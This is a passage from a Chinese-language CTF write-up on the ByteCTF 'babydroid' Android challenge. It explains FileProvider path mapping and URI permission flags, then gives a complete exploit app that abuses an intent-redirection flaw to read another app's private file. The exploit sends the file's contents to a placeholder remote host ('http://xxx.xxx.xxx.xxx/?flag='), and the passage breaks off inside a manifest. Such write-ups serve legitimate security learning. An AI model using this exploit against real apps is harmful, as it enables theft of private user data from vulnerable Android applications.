&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getFilesDir() 在 Android 上，必然返回：</span><br><span class="line">/data/data/&lt;应用包名&gt;/files</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><p>肯定会写到这个路径</p><h3 id="FileProvider"><a href="#FileProvider" class="headerlink" title="FileProvider"></a><strong>FileProvider</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider android:name=&quot;androidx.core.content.FileProvider&quot; android:exported=&quot;false&quot; android:authorities=&quot;androidx.core.content.FileProvider&quot; android:grantUriPermissions=&quot;true&quot;&gt;</span><br><span class="line">    &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot;/&gt;</span><br><span class="line">&lt;/provider&gt;</span><br></pre></td></tr></table></figure><p><code>FileProvider</code> 是 Android 官方提供的“安全文件中转器”，用来把 App 私有文件，安全地以 <code>content://</code> 形式分享给别人。</p><p>早期 Android，App 想把文件给别的 App，只能用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>FileProvider 的设计目的</p><blockquote><p><strong>不暴露真实路径，只给一个“受控的虚拟 URI”。</strong></p></blockquote><p>所以 FileProvider 做了三件事：</p><ol><li>把私有文件映射成 <code>content://</code> URI</li><li>控制 <strong>哪些路径可以被映射</strong></li><li>控制 <strong>哪些 App 可以临时访问</strong></li></ol><p>exported&#x3D;false 外部 App 不能直接访问这个 provider，不能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">    android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;</span><br><span class="line">    android:resource=&quot;@xml/file_paths&quot;/&gt;</span><br></pre></td></tr></table></figure><p>xml&#x2F;file_paths有路径</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115224738520.png" alt="image-20260115224738520"></p><table><thead><tr><th>子节点</th><th>含义</th></tr></thead><tbody><tr><td><strong>root-path</strong></td><td>代表设备的根目录 &#x2F;</td></tr><tr><td><strong>files-path</strong></td><td>代表 APP 内部存储空间私有目录下的files 目录，等同于 Context.getFilesDir()所获取的目录路径</td></tr><tr><td><strong>cache-path</strong></td><td>代表内部存储的 cache 目录，与 Context.getCacheDir()获取的路径对应</td></tr><tr><td><strong>external-path</strong></td><td>代表外部存储 (sdcard) 的根目录，与 Environment.getExternalStorageDirectory() 获取的路径对应。</td></tr><tr><td><strong>external-files-path</strong></td><td>代表外部存储空间 APP 私有目录下的 files目录，与Context.getExternalFilesDir(null)获取的路径对应</td></tr><tr><td><strong>external-cache-path</strong></td><td>外部存储空间 APP 私有目录下的 cache目录，等同于Context.getExternalCacheDir()</td></tr><tr><td><strong>external-media-path</strong></td><td>代表app 外部存储媒体区域的根目录，与Context.getExternalMediaDirs()获取的路径对应</td></tr></tbody></table><p>意思是：只允许分享 <code>getFilesDir()</code> 目录下的文件</p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115223803430.png" alt="image-20260115223803430" style="zoom:50%;" /><p><code>/data/data/.../files/flag</code>： <strong>保险箱里真正的文件</strong></p><p>FileProvider：<strong>可以临时发一张“取件码&#x2F;通行证”给别人</strong></p><p>别人凭这个码（<code>content://...</code>）去拿你允许的那份文件</p><table><thead><tr><th><strong>android:name</strong></th><th>Android 提供的 FileProvider的实现类</th></tr></thead><tbody><tr><td><strong>android:exported</strong></td><td>建议指定为 **<code>false</code>**，表示该 FileProvider 只能本应用使用，不是 <code>public</code>的</td></tr><tr><td><strong>android:authorities</strong></td><td>相当于一个用于认证的暗号，在分享文件生成 Uri 时，会通过它的值生成对应的 Uri，该值是一个域名，一般格式为 packagename.fileprovider</td></tr><tr><td><strong>android:grantUriPermissions</strong></td><td>值为**<code>true</code>**，表示允许赋予临时权限，即设置为共享</td></tr><tr><td><strong>meta-data</strong></td><td>指定配置共享目录的配置文件</td></tr></tbody></table><blockquote><p>来自LLeaves</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Intent 本身不能绕过权限，但携带了 URI 授权的 Intent可以把对某一个具体文件&#x2F;数据的访问权临时转交给别人</p><p>Intent 是如何提供对内容提供程序的间接访问的?</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://com.xxx.provider/images/123</span><br></pre></td></tr></table></figure><p>这是一个具体到单条资源的 URI</p><p>拥有权限的 App 构造 Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setData(uri);</span><br><span class="line">i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:grantUriPermission=&quot;true&quot;&gt;</span><br></pre></td></tr></table></figure><p>意思是：可以通过 Intent 临时把某个 URI 的访问权授予别人</p><p>如果（且仅如果）被攻击 App 主动通过 Intent 把某个 <code>content://</code> URI 发给攻击者，并且在这个 Intent 上授予了 URI 权限（FLAG_GRANT_*），<br>同时 Provider 允许 URI 授权（grantUriPermissions&#x3D;true），且 file_paths.xml 允许映射到该文件，那么攻击者就可以“临时”读取这个具体文件。</p><p>好，总结完后我们可以最终利用漏洞</p><p>因为file provider设置为非导出，也就意味着外部无法访问。当需要进行文件共享的时候，需要在Intent中加入下面这些中Grant相关的flags <strong>,在这里使用前两个就可以</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_READ_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000001</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_WRITE_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000002</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_PREFIX_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000080</span>;</span><br></pre></td></tr></table></figure><ul><li><p>FLAG_GRANT_READ_URI_PERMISSION：允许接收者读取 URI 的内容，即读取 URI 的数据，并在权限授予期间保持该权限。</p></li><li><p>FLAG_GRANT_WRITE_URI_PERMISSION：允许接收者写入 URI 的内容，即修改 URI 的数据，并在权限授予期间保持该权限。</p></li><li><p>FLAG_GRANT_PERSISTABLE_URI_PERMISSION：与LAG_GRANT_READ_URI_PERMISSION&#96;或 FLAG_GRANT_WRITE_URI_PERMISSION一起使用，表示允许接收者在授予许可后持久保存该权限。这意味着即使应用程序被关闭，权限也会保持有效，并且对 URI 的访问仍然是允许的。</p></li><li><p>FLAG_GRANT_PREFIX_URI_PERMISSION：允许接收者读取或写入指定 URI 的所有后代 URI，而不必单独为每个 URI 授予权限。</p></li></ul><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    android:exported=&quot;false&quot;&gt;</span><br></pre></td></tr></table></figure><p>意思是：</p><blockquote><p><strong>外部 App 不能直接通过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/...</span><br></pre></td></tr></table></figure><p><strong>来访问这个 Provider</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().openInputStream(</span><br><span class="line">    Uri.parse(&quot;content://androidx.core.content.FileProvider/xxx&quot;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这样会被直接拒绝</p></blockquote><p>但是Android 允许一种<strong>例外机制</strong>：</p><blockquote><p><strong>“Provider 自己通过 Intent，把某个 URI 的访问权临时交给别人”</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">是否 exported=true ?</span><br><span class="line">    是 → 允许（再看权限）</span><br><span class="line">    否 → 看有没有 URI permission</span><br><span class="line">              有 → 允许</span><br><span class="line">              没有 → 拒绝</span><br><span class="line">FLAG_GRANT_*</span><br><span class="line">显式“破例放行某一个 URI</span><br></pre></td></tr></table></figure><p>获得权限之后是构造URI去获得flag</p><p>真实文件路径是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><p>FileProvider 的 URI 是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://&lt;authority&gt;/&lt;virtual-path&gt;/&lt;relative-path&gt;</span><br></pre></td></tr></table></figure><p>它完全由 <code>file_paths.xml</code> 决定。</p><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;paths&gt;</span><br><span class="line">    &lt;root-path name=&quot;root&quot; path=&quot;.&quot;/&gt;</span><br><span class="line">&lt;/paths&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>XML</th><th>含义</th></tr></thead><tbody><tr><td>name&#x3D;”root”</td><td>URI 中的第一段路径</td></tr><tr><td>path&#x3D;”.”</td><td>映射到真实文件系统的根</td></tr></tbody></table><p>于是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://authority/root/data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>才会 <strong>映射到</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>因此有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><blockquote><p>不是硬规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    android:authorities=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    ... /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>android:authorities&#x3D;”com.example.app.fileprovider”</p><p>这样做的好处是：</p><ul><li>避免 authority 冲突</li><li>一看就知道是谁的 Provider</li></ul><p>因为总流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 解析 URI</span><br><span class="line">2. 取出 authority = &quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">3. 在已安装 App 的 AndroidManifest.xml 里查：</span><br><span class="line">   哪个 &lt;provider&gt; 声明了这个 authority</span><br><span class="line">4. 找到对应的 Provider 实例</span><br><span class="line">5. 交给它的 openFile() / query() 等方法处理</span><br></pre></td></tr></table></figure></blockquote><p>如何获得授权?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vulnerable</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> (Intent) getIntent().getParcelableExtra(<span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = (Intent) getIntent().getParcelableExtra(&quot;intent&quot;);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><blockquote><p>getParcelableExtra(key) 的意思是：从“启动这个 Activity 的 Intent 的 extras（Bundle）里，按 key 取出一个 Parcelable 对象，并反序列化成 Java 对象。如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent</span><br><span class="line"> ├─ action</span><br><span class="line"> ├─ data</span><br><span class="line"> ├─ flags</span><br><span class="line"> └─ extras (Bundle)</span><br><span class="line">      ├─ &quot;intent&quot; -&gt; [一段 Parcelable 二进制数据]</span><br><span class="line">      ├─ &quot;foo&quot;    -&gt; &quot;bar&quot;</span><br><span class="line">      └─ ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>extras</code> 是一个 <strong>Bundle</strong>，本质是：<strong>key → value 的映射表</strong></p><p><strong>Parcelable &#x3D; Android 定义的一种“可跨进程序列化的对象格式”</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent inner = getIntent().getParcelableExtra(&quot;intent&quot;);</span><br></pre></td></tr></table></figure><p>这个的意思是得到Intent再把里面extra中的一个自称”intent”当成真正的Intent</p><p>到此漏洞利用全流程结束</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>可以编写如下脚本</p><p>MainActivity，本文末尾介绍了下各个函数的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getIntent().getAction() == <span class="string">&quot;evil&quot;</span> )&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getContentResolver().openInputStream(getIntent().getData());</span><br><span class="line">                <span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">                inputStream.read(flag);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                Log.d(<span class="string">&quot;PWN&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">HttpGetAsyncTask</span>().execute(<span class="string">&quot;http://xxx.xxx.xxx.xxx/?flag=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent_back</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">            intent_back.setClassName(getApplication().getPackageName(), MainActivity.class.getName());</span><br><span class="line">            intent_back.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"> intent_back.setData(Uri.parse(<span class="string">&quot;content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setAction(<span class="string">&quot;com.bytectf.TEST&quot;</span>);</span><br><span class="line">            intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;intent&quot;</span>, intent_back);</span><br><span class="line"></span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream inputStream = getContentResolver().openInputStream(getIntent().getData());</span><br></pre></td></tr></table></figure><blockquote><p>用当前 App 的 ContentResolver，按 Intent 里携带的 URI，打开一个读取该资源内容的输入流</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContentResolver cr = getContentResolver();</span><br></pre></td></tr></table></figure><p>含义是：向 Android 系统申请一个内容访问代理，不能直接和别的 App 的 ContentProvider 通信，必须通过 ContentResolver。</p><p>发送函数，注：LLeaves博客上的发送已经无法使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.AsyncTask;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpGetAsyncTask</span> <span class="keyword">extends</span> <span class="title class_">AsyncTask</span>&lt;String, Void, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">doInBackground</span><span class="params">(String... params)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> params[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">con</span> <span class="operator">=</span> (HttpURLConnection) <span class="keyword">new</span> <span class="title class_">URL</span>(url).openConnection();</span><br><span class="line">            con.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">            con.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">            con.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> con.getResponseCode();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;HTTP &quot;</span> + code;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Exception: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPostExecute</span><span class="params">(String result)</span> &#123;</span><br><span class="line">        android.util.Log.d(<span class="string">&quot;PWN&quot;</span>, <span class="string">&quot;Send result: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外Manifest需要为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Pwnbabydroid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span 